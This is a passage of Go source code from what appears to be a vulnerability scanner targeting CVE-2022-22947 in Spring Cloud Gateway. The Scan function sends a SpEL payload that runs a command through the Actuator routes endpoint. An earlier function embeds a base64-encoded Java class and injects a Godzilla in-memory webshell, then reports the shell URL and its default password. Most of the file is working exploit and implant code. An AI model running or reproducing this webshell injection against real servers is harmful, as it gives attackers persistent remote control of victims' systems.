/BwB/AAEHAH4AAIAAAAAFAQCNAAAACQCVAJYAAwBrAAABRAAGAAUAAAByAU0SOLgAOUwrEjoBtgA7KwG2ABlOLbYAChI8BL0ADFkDEiVTtgA7LQS9AA1ZAypTtgAZwAAVTacAOU4SPbgAOUwrtgA+OgQZBLYAChI/BL0ADFkDEiVTtgA7GQQEvQANWQMqU7YAGcAAFU2nAAU6BCywAAIAAgA3ADoAGwA7AGsAbgAbAAMAbAAAADIADAAAAEsAAgBNAAgATgAVAE8ANwBXADoAUAA7AFIAQQBTAEcAVABrAFYAbgBVAHAAWABtAAAASAAHABUAIgCXAHsAAwAIADIAmACZAAEARwAkAJcAewAEAEEALQCYAJkAAQA7ADUAeAB5AAMAAAByAJoAhAAAAAIAcACbAGYAAgB9AAAAKgAD/wA6AAMHACUABwB/AAEHAH7/ADMABAcAJQAHAH8HAH4AAQcAfvoAAQCIAAAABAABABsAgAAAAAUBAJoAAAAJAJwAnQADAGsAAAFKAAYABQAAAHgBTRI4uAA5TCsSQAG2ADsrAbYAGU4ttgAKEkEEvQAMWQMSFVO2ADstBL0ADVkDKlO2ABnAACXAACVNpwA8ThJCuAA5TCu2AD46BBkEtgAKEkMEvQAMWQMSFVO2ADsZBAS9AA1ZAypTtgAZwAAlwAAlTacABToELLAAAgACADoAPQAbAD4AcQB0ABsAAwBsAAAAMgAMAAAAXQACAF8ACABgABUAYQA6AGkAPQBiAD4AZABEAGUASgBmAHEAaAB0AGcAdgBqAG0AAABIAAcAFQAlAJ4AewADAAgANQCYAJkAAQBKACcAngB7AAQARAAwAJgAmQABAD4AOAB4AHkAAwAAAHgAmgBmAAAAAgB2AJsAhAACAH0AAAAqAAP/AD0AAwcAfwAHACUAAQcAfv8ANgAEBwB/AAcAJQcAfgABBwB++gABAIgAAAAEAAEAGwCAAAAABQEAmgAAACEAnwCgAAMAawAAAJQABAADAAAALCu5AEQBACq6AEUAALYARk27AEdZLLIASLcASbBNuwBHWSy2AEqyAEi3AEmwAAEAAAAbABwAGwADAGwAAAASAAQAAABxABAAiAAcAIkAHQCKAG0AAAAqAAQAEAAMAKEAewACAB0ADwCiAHkAAgAAACwAbgBvAAAAAAAsAKMApAABAH0AAAAGAAFcBwB+AIAAAAAFAQCjAAAApQAAAA4AAQCmAAEAm1sAAXMApxACAKgAqQACAGsAAAGYAAQABwAAAMC7AAJZtwADTSuyAAS5AEsCAMAAFU4qLbgATAO2AE06BLIAThJPuQBQAgDHABayAE4STxkEuABRuQBSAwBXpwBusgBOElMZBLkAUgMAV7sAVFm3AFU6BbIAThJPuQBQAgDAAAy2AD46BhkGGQW2AFZXGQYZBLYAVlcssgAJAxAQtgBXtgAFVxkGtgBYVywqGQW2AFkEtgBNuABatgAFVyyyAAkQELYAW7YABVenAA1OLC22AEq2AAVXLLYAB7gAXLAAAQAIAKsArgAbAAMAbAAAAEoAEgAAAHIACAB0ABUAdQAgAHYALQB3AEAAeQBNAHoAVgB7AGgAfABwAH0AeAB+AIYAfwCMAIAAngCBAKsAhQCuAIMArwCEALgAhgBtAAAAUgAIAFYAVQCqAKsABQBoAEMArAB7AAYAFQCWAK0AZgADACAAiwCuAIQABACvAAkAogB5AAMAAADAAG4AbwAAAAAAwACLAK8AAQAIALgAsACxAAIAfQAAABYABP4AQAcAsgcAfwcAJfkAakIHAH4JAIAAAAAFAQCLEAAACACzAGoAAQBrAAAAMQACAAAAAAAVuwBdWbcAXrMAThJfswAEEmCzAAaxAAAAAQBsAAAACgACAAAAFwAKABgAAwC0AAAAAgC1AScAAAASAAIAyQAPASYGCQFyAXUBcwAZAPkAAAAMAAEA+gADAPsA/AD9'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'%s')}`, path),
				},
			},
		},
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{
			{
				"name": "Path",
				"args": map[string]string{
					"pattern": "/test",
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("序列化载荷失败: %w", err)
	}
	log.LogScanStep("CVE-2022-22947注入哥斯拉内存马", map[string]interface{}{
		"target":           target,
		"basePath":         basePath,
		"maliciousRouteID": maliciousRouteID,
		"payload":          string(jsonData),
	}, baseCtx)

	// 添加恶意路由
	addroute := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
	add_req, err := http.NewRequest("POST", addroute, bytes.NewBufferString(string(jsonData)))
	if err != nil {
		return "", fmt.Errorf("创建添加路由请求失败: %w", err)
	}
	add_req.Header.Set("Content-Type", "application/json")

	add_resp, err := client.Do(add_req)
	if err != nil {
		return "", fmt.Errorf("添加路由失败: %w", err)
	}
	defer add_resp.Body.Close()

	if add_resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("添加路由失败，状态码: %d", add_resp.StatusCode)
	}

	// 清理路由
	defer func() {
		deleteURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
		log.LogScanStep("CVE-2022-22947删除哥斯拉内存马路由", map[string]interface{}{
			"target":           target,
			"basePath":         basePath,
			"maliciousRouteID": maliciousRouteID,
		})
		var deleteReq *http.Request
		var deleteResp *http.Response
		deleteReq, err = http.NewRequest("DELETE", deleteURL, nil)
		if err == nil {
			deleteReq.Header.Set("Content-Type", "application/json")
			if deleteResp, err = client.Do(deleteReq); err == nil && deleteResp.Body != nil {
				io.Copy(io.Discard, deleteResp.Body)
				deleteResp.Body.Close()
			}
		}
	}()

	// 刷新路由
	refreshURL := fmt.Sprintf("%s%s/gateway/refresh", target, basePath)
	refreshReq, err := http.NewRequest("POST", refreshURL, nil)
	if err != nil {
		return "", fmt.Errorf("创建刷新路由请求失败: %w", err)
	}
	refreshReq.Header.Set("Content-Type", "application/json")

	refreshResp, err := client.Do(refreshReq)
	if err != nil {
		return "", fmt.Errorf("刷新路由失败: %w", err)
	}
	defer refreshResp.Body.Close()

	if refreshResp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("刷新路由失败，状态码: %d", refreshResp.StatusCode)
	}

	// 访问测试路径，触发命令执行
	getURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
	getreq, err := http.NewRequest("GET", getURL, nil)
	if err != nil {
		return "", fmt.Errorf("创建获取命令结果的请求失败: %w", err)
	}
	getreq.Header.Set("Content-Type", "application/json")

	_, _ = client.Do(getreq)

	memoryURL := fmt.Sprintf("%s%s", target, path)
	log.LogScanStep("CVE-2022-22947测试内存马注入", map[string]interface{}{
		"target": target,
		"path":   path,
	})
	memoryReq, err := http.NewRequest(http.MethodPost, memoryURL, nil)
	if err != nil {
		return "", fmt.Errorf("创建内存读取请求失败: %w", err)
	}
	memoryReq.Header.Set("Content-Type", "application/json")
	memoryResp, err := client.Do(memoryReq)
	if err != nil {
		return "", fmt.Errorf("读取内存失败: %w", err)
	}
	defer memoryResp.Body.Close()

	if memoryResp.StatusCode == http.StatusOK {
		log.LogScanStep("CVE-2022-22947测试内存马注入成功", map[string]interface{}{
			"target": target,
			"path":   path,
		})
		return fmt.Sprintf("注入哥斯拉内存马成功，shell地址: %s （默认key pass） 选择base64", memoryURL), nil
	}
	log.LogScanStep("CVE-2022-22947测试内存马注入失败", map[string]interface{}{
		"target": target,
		"path":   path,
	})

	return "", fmt.Errorf("注入内存马失败，状态码: %d", memoryResp.StatusCode)
}

// GetSupportedFeatures 获取支持的功能
func (s *CVE202222947Scanner) GetSupportedFeatures() []string {
	return []string{"command", "shell", "memory"} // 支持命令执行和反弹shell
}

// Scan 执行CVE-2022-22947漏洞扫描
func (s *CVE202222947Scanner) Scan(ctx context.Context, target string, options ScanOptions) ([]common.Vulnerability, error) {
	var vulnerabilities []common.Vulnerability

	// 初始化统计信息
	s.statistics = ScanStatistics{}
	s.startTime = time.Now()

	// 获取或创建Logger
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	// 创建日志上下文
	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("开始CVE-2022-22947漏洞扫描", baseCtx)
	log.LogScanStep("初始化扫描器", map[string]interface{}{
		"timeout":     options.Timeout,
		"proxy":       options.Proxy != "",
		"randomAgent": options.RandomAgent,
	}, baseCtx)

	// 检查上下文是否已取消
	select {
	case <-ctx.Done():
		err := &ScanError{
			Type:    ErrorTypeTimeout,
			Message: "扫描上下文已取消",
			Target:  target,
			Err:     ctx.Err(),
		}
		log.Error("扫描被取消", err, baseCtx)
		return nil, err
	default:
	}

	// 创建HTTP客户端
	clientConfig := client.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "",
		Headers: map[string]string{
			"Content-Type": "application/json",
			"User-Agent":   client.GetRandomUserAgent(),
		},
		Cookies: map[string]string{},
	}
	if options.RandomAgent {
		clientConfig.UserAgent = client.GetRandomUserAgent()
		log.Debug(fmt.Sprintf("使用随机User-Agent: %s", clientConfig.UserAgent), baseCtx)
	}

	client, err := client.NewHTTPClient(clientConfig)
	if err != nil {
		log.Error("创建HTTP客户端失败", err, baseCtx)
		return nil, &ScanError{
			Type:    ErrorTypeConfig,
			Message: "创建HTTP客户端失败",
			Target:  target,
			Err:     err,
		}
	}

	log.LogScanStep("HTTP客户端创建成功", map[string]interface{}{
		"timeout":     options.Timeout,
		"proxy":       options.Proxy != "",
		"randomAgent": options.RandomAgent,
	}, baseCtx)

	log.LogScanStep("开始CVE-2022-22947扫描", map[string]interface{}{
		"target":            target,
		"description":       "检查是否存在CVE-2022-22947漏洞",
		"vulnerabilityType": "CVE-2022-22947",
		"riskLevel":         "高",
		"attackVector":      "过Actuator端点添加恶意路由",
	}, baseCtx)

	// Actuator端点路径
	basePath := "/actuator"

	// 构造恶意路由配置，包含SpEL表达式
	charSetCfg := utils.DefaultRandomStringConfig()
	charSetCfg.Length = 10
	maliciousRouteID, err := utils.GenerateRandomString(charSetCfg)
	if err != nil {
		log.Error("生成随机字符集失败", err, baseCtx)
		return nil, &ScanError{
			Type:    ErrorTypeConfig,
			Message: "生成随机字符集失败",
			Target:  target,
			Err:     err,
		}
	}

	log.Info(fmt.Sprintf("路由ID: %s", maliciousRouteID), baseCtx)
	log.Info(fmt.Sprintf("测试路径: %s", basePath), baseCtx)

	// 构造测试载荷
	command := "echo QAXNB12138"

	payload := map[string]interface{}{
		"id": maliciousRouteID,
		"filters": []map[string]interface{}{
			{
				"name": "AddResponseHeader",
				"args": map[string]string{
					"name":  "Result",
					"value": `#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("` + command + `").getInputStream()))}`,
				},
			},
		},
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{
			{
				"name": "Path",
				"args": map[string]string{
					"pattern": "/test",
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {

		return nil, fmt.Errorf("序列化路由配置失败: %w", err)
	}

	log.Info(fmt.Sprintf("测试载荷: %s", string(jsonData)), baseCtx)

	// 检查上下文是否已取消
	select {
	case <-ctx.Done():
		err := &ScanError{
			Type:    ErrorTypeTimeout,
			Message: "扫描上下文已取消",
			Target:  target,
			Err:     ctx.Err(),
		}
		log.Error("扫描被取消", err, baseCtx)
		return nil, err
	default:
	}
	target = strings.TrimRight(target, "/") // 移除末尾的斜杠
	log.LogScanStep("检查Actuator端点", map[string]interface{}{
		"endpoint": fmt.Sprintf("%s/gateway/routes", basePath),
	}, baseCtx)

	// 检查是否可以访问Actuator端点
	routesURL := fmt.Sprintf("%s%s/gateway/routes", target, basePath)

	log.LogRequest("GET", routesURL, map[string]string{}, nil, baseCtx)
	start := time.Now()
	resp, err := client.Get(routesURL)
	duration := time.Since(start)
	if err != nil {
		log.Error(fmt.Sprintf("无法访问端点: %v", err), err, baseCtx)
		return nil, &ScanError{
			Type:    ErrorTypeNetwork,
			Message: "无法访问Actuator端点",
			Target:  target,
			Err:     err,
		}
	}
	defer resp.Body.Close()

	// 读取响应体
	bodyBuf := &bytes.Buffer{}
	if _, err := io.Copy(bodyBuf, resp.Body); err != nil {
		log.Error(fmt.Sprintf("读取响应体失败: %v", err), err, baseCtx)
		return nil, &ScanError{
			Type:    ErrorTypeNetwork,
			Message: "读取响应体失败",
			Target:  target,
			Err:     err,
		}
	}

	// 获取响应头
	respHeaders := make(map[string]string)
	for k, v := range resp.Header {
		if len(v) > 0 {
			respHeaders[k] = v[0]
		}
	}

	log.LogResponse(resp.StatusCode, respHeaders, bodyBuf.Bytes(), duration, baseCtx)

	// 检查响应状态码
	if resp.StatusCode == http.StatusOK {
		log.Info(fmt.Sprintf("端点可访问 (状态码: %d)，尝试添加恶意路由", resp.StatusCode), baseCtx)

		// 构造添加路由的请求
		addroute := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)

		// 检查上下文是否已取消
		select {
		case <-ctx.Done():
			err := &ScanError{
				Type:    ErrorTypeTimeout,
				Message: "扫描上下文已取消",
				Target:  target,
				Err:     ctx.Err(),
			}
			log.Error("扫描被取消", err, baseCtx)
			return nil, err
		default:
		}

		log.LogScanStep("测试路由注入", map[string]interface{}{
			"endpoint": addroute,
			"payload":  payload,
		},
			baseCtx)

		// 发送POST请求添加恶意路由
		add_headers := map[string]string{
			"Content-Type": "application/json",
		}

		log.LogRequest("POST", addroute, add_headers, jsonData, baseCtx)
		add_req, err := http.NewRequestWithContext(ctx, "POST", addroute, bytes.NewBufferString(string(jsonData)))
		if err != nil {
			log.Error(fmt.Sprintf("创建添加路由请求失败: %v", err), err, baseCtx)
			return nil, &ScanError{
				Type:    ErrorTypeNetwork,
				Message: "创建添加路由请求失败",
				Target:  target,
				Err:     err,
			}
		}
		add_req.Header.Set("Content-Type", "application/json")
		start = time.Now()
		add_resp, err := client.Do(add_req)
		duration = time.Since(start)
		if err != nil {
			log.Error(fmt.Sprintf("添加路由请求失败: %v", err), err, baseCtx)
			// 继续进行，因为可能是权限问题或其他原因
			return nil, &ScanError{
				Type:    ErrorTypeNetwork,
				Message: "添加路由请求失败",
				Target:  target,
				Err:     err,
			}
		}
		defer add_resp.Body.Close()

		// 读取响应体
		bodyBuf = &bytes.Buffer{}
		if _, err := io.Copy(bodyBuf, add_resp.Body); err != nil {
			log.Error(fmt.Sprintf("读取添加路由响应体失败: %v", err), err, baseCtx)
			// 继续进行
		}

		// 获取响应头
		respHeaders = make(map[string]string)
		for k, v := range add_resp.Header {
			if len(v) > 0 {
				respHeaders[k] = v[0]
			}
		}

		log.LogResponse(add_resp.StatusCode, respHeaders, bodyBuf.Bytes(), duration, baseCtx)

		// 检查路由添加是否成功
		if add_resp.StatusCode == http.StatusCreated { // || add_resp.StatusCode == http.StatusOK
			log.Info(fmt.Sprintf("路由添加成功 (状态码: %d)，开始刷新路由", resp.StatusCode), baseCtx)
			cleanupRoute := func() {
				deleteURL := routesURL + "/" + maliciousRouteID
				log.LogScanStep("删除恶意路由", map[string]interface{}{
					"deleteURL": deleteURL,
					"routeID":   maliciousRouteID,
				}, baseCtx)

				deleteReq, err := http.NewRequest("DELETE", deleteURL, nil)
				if err == nil {
					deleteReq.Header.Set("Content-Type", "application/json")
					if deleteResp, err := client.Do(deleteReq); err == nil && deleteResp.Body != nil {
						io.Copy(io.Discard, deleteResp.Body)
						deleteResp.Body.Close()
					}
				}
			}
			defer cleanupRoute()
			// 构造刷新路由的请求
			refreshURL := fmt.Sprintf("%s%s/gateway/refresh", target, basePath)

			log.LogScanStep("刷新路由", map[string]interface{}{
				"endpoint": refreshURL,
			}, baseCtx)

			reheaders := map[string]string{}

			log.LogRequest("POST", refreshURL, reheaders, nil, baseCtx)
			refreshReq, err := http.NewRequestWithContext(ctx, "POST", refreshURL, nil)
			if err != nil {
				log.Error(fmt.Sprintf("创建刷新路由请求失败: %v", err), err, baseCtx)
				return nil, &ScanError{
					Type:    ErrorTypeNetwork,
					Message: "创建刷新路由请求失败",
					Target:  target,
					Err:     err,
				}
			}
			refreshReq.Header.Set("Content-Type", "application/json")
			start = time.Now()
			refreshResp, err := client.Do(refreshReq)
			refreshDuration := time.Since(start)
			if err != nil {
				log.Error(fmt.Sprintf("刷新路由失败: %v", err), err, baseCtx)
				return nil, err
			} else {
				defer refreshResp.Body.Close()

				// 读取响应体
				refreshBodyBuf := &bytes.Buffer{}
				if _, err := io.Copy(refreshBodyBuf, refreshResp.Body); err != nil {
					log.Warn(fmt.Sprintf("读取刷新路由响应体失败: %v", err), baseCtx)
				}

				// 获取响应头
				refreshHeaders := make(map[string]string)
				for k, v := range refreshResp.Header {
					if len(v) > 0 {
						refreshHeaders[k] = v[0]
					}
				}

				log.LogResponse(refreshResp.StatusCode, refreshHeaders, refreshBodyBuf.Bytes(), refreshDuration, baseCtx)

				log.LogScanStep("刷新路由", map[string]interface{}{
					"status_code": refreshResp.StatusCode,
				}, baseCtx)

				if refreshResp.StatusCode == http.StatusOK {
					log.Info(fmt.Sprintf("路由刷新成功 (状态码: %d)", refreshResp.StatusCode), baseCtx)

					// 构造获取路由信息的请求
					getURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
					getHeaders := map[string]string{}

					log.LogScanStep("获取路由信息", map[string]interface{}{
						"getURL": getURL,
					}, baseCtx)
					log.LogRequest("GET", getURL, getHeaders, nil, baseCtx)
					getReq, err := http.NewRequestWithContext(ctx, "GET", getURL, nil)
					if err != nil {
						log.Error(fmt.Sprintf("创建获取路由信息请求失败: %v", err), err, baseCtx)
						// 继续尝试删除路由
						return nil, err
					}
					getReq.Header.Set("Content-Type", "application/json")
					start = time.Now()
					getResp, err := client.Do(getReq)
					getDuration := time.Since(start)
					if err != nil {
						log.Error(fmt.Sprintf("获取路由信息失败: %v", err), err, baseCtx)
						// 继续尝试删除路由
						return nil, err
					} else {
						defer getResp.Body.Close()

						// 读取响应体
						getBody := &bytes.Buffer{}
						if _, err := io.Copy(getBody, getResp.Body); err != nil {
							log.Error(fmt.Sprintf("读取路由信息响应体失败: %v", err), err, baseCtx)
							// 继续尝试删除路由
							return nil, err
						} else {

							// 获取响应头
							responseHeaders := make(map[string]string)
							for k, v := range getResp.Header {
								if len(v) > 0 {
									responseHeaders[k] = v[0]
								}
							}

							log.LogResponse(getResp.StatusCode, responseHeaders, getBody.Bytes(), getDuration, baseCtx)

							if getResp.StatusCode == http.StatusOK {
								log.Info(fmt.Sprintf("获取路由信息响应体成功（状态码: %d）", getResp.StatusCode), baseCtx)

								log.LogScanStep("判断是否存在漏洞", map[string]interface{}{
									"response_body": getBody.String(),
								}, baseCtx)

								// 解析响应体，检查是否包含恶意代码
								var routeResponse map[string]interface{}
								if err := json.Unmarshal(getBody.Bytes(), &routeResponse); err != nil {
									log.Error(fmt.Sprintf("解析路由信息响应体失败: %v", err), err, baseCtx)
									// 继续尝试删除路由
									return nil, err
								} else {
									// 检查路由配置是否包含恶意代码
									// 如果路由被成功添加并刷新，说明可能存在漏洞
									if strings.Contains(getBody.String(), "QAXNB12138") {

										// 创建漏洞信息
										vulnerability := common.Vulnerability{
											ID:                1,
											VulnerabilityType: "CVE-2022-22947",
											Severity:          "严重",
											Target:            target,
											URL:               routesURL,
											Payload:           string(jsonData),
											Description:       "Spring Cloud Gateway SpEL远程代码执行漏洞",
											Proof:             fmt.Sprintf("成功添加恶意路由: %s", maliciousRouteID),
											Recommendation:    "升级到安全版本或禁用Actuator端点",
											ResponseHeaders:   responseHeaders,
											ResponseContent:   getBody.String(),
											Timestamp:         time.Now(),
										}

										log.LogVulnerabilityFound(vulnerability, baseCtx)
										log.Info(fmt.Sprintf("发现漏洞: %s at %s", vulnerability.VulnerabilityType, routesURL), baseCtx)

										vulnerabilities = append(vulnerabilities, vulnerability)
										// 更新统计信息
										s.statistics.VulnerabilitiesFound++
									}
								}
							}
						}
					}
				}

				// // 使用Do方法发送DELETE请求
				// deleteURL := fmt.Sprintf("%s%s/gateway/routes/%s", target, basePath, maliciousRouteID)
				// deleteReq, err := http.NewRequest("DELETE", deleteURL, nil)
				// if err != nil {
				// 	log.Warn(fmt.Sprintf("创建删除请求失败: %v", err), baseCtx)
				// } else {
				// 	// 设置请求头
				// 	for k, v := range reheaders {
				// 		deleteReq.Header.Set(k, v)
				// 	}

				// 	log.LogRequest("DELETE", deleteURL, reheaders, nil, baseCtx)
				// 	start = time.Now()
				// 	deleteResp, err := client.Do(deleteReq)
				// 	deleteDuration := time.Since(start)
				// 	if err != nil {
				// 		log.Warn(fmt.Sprintf("删除路由失败: %v", err), baseCtx)
				// 	} else {
				// 		defer deleteResp.Body.Close()

				// 		// 读取响应体
				// 		deleteBody := &bytes.Buffer{}
				// 		if _, err := io.Copy(deleteBody, deleteResp.Body); err != nil {
				// 			log.Warn(fmt.Sprintf("读取删除路由响应体失败: %v", err), baseCtx)
				// 		}

				// 		// 获取响应头
				// 		deleteHeaders := make(map[string]string)
				// 		for k, v := range deleteResp.Header {
				// 			if len(v) > 0 {
				// 				deleteHeaders[k] = v[0]
				// 			}
				// 		}

				// 		log.LogResponse(deleteResp.StatusCode, deleteHeaders, deleteBody.Bytes(), deleteDuration, baseCtx)

				// 		if deleteResp.StatusCode == http.StatusOK {
				// 			log.Info(fmt.Sprintf("恶意路由删除成功 (状态码: %d)", deleteResp.StatusCode), baseCtx)
				// 		} else {
				// 			log.Warn(fmt.Sprintf("恶意路由删除失败 (状态码: %d)", deleteResp.StatusCode), baseCtx)
				// 		}
				// 	}
				// }

				// // 再次刷新路由以确保更改生效
				// log.LogRequest("POST", refreshURL, reheaders, nil, baseCtx)
				// start = time.Now()
				// refreshResp, err = client.Post(refreshURL, "", []byte(""))
				// refreshDuration = time.Since(start)
				// if err != nil {
				// 	log.Warn(fmt.Sprintf("第二次刷新路由失败: %v", err), baseCtx)
				// } else {
				// 	defer refreshResp.Body.Close()

				// 	// 读取响应体
				// 	refreshBodyBuf := &bytes.Buffer{}
				// 	if _, err := io.Copy(refreshBodyBuf, refreshResp.Body); err != nil {
				// 		log.Warn(fmt.Sprintf("读取第二次刷新路由响应体失败: %v", err), baseCtx)
				// 	}

				// 	// 获取响应头
				// 	refreshHeaders := make(map[string]string)
				// 	for k, v := range refreshResp.Header {
				// 		if len(v) > 0 {
				// 			refreshHeaders[k] = v[0]
				// 		}
				// 	}

				// 	log.LogResponse(refreshResp.StatusCode, refreshHeaders, refreshBodyBuf.Bytes(), refreshDuration, baseCtx)

				// 	if refreshResp.StatusCode == http.StatusOK {
				// 		log.Info(fmt.Sprintf("第二次路由刷新成功 (状态码: %d)", refreshResp.StatusCode), baseCtx)
				// 	} else {
				// 		log.Warn(fmt.Sprintf("第二次路由刷新失败 (状态码: %d)", refreshResp.StatusCode), baseCtx)
				// 	}
				// }
			}
		}
	}

	// 等待指定的延迟时间
	if options.Delay > 0 {
		log.Debug(fmt.Sprintf("等待 %v 后继续", options.Delay), baseCtx)
		time.Sleep(options.Delay)
	}

	// 更新统计信息
	s.statistics.ScanDuration = time.Since(s.startTime)

	log.Info(fmt.Sprintf("扫描统计[扫描耗时: %v, 发现漏洞数: %d]", s.statistics.ScanDuration, s.statistics.VulnerabilitiesFound), baseCtx)

	return vulnerabilities, nil
}
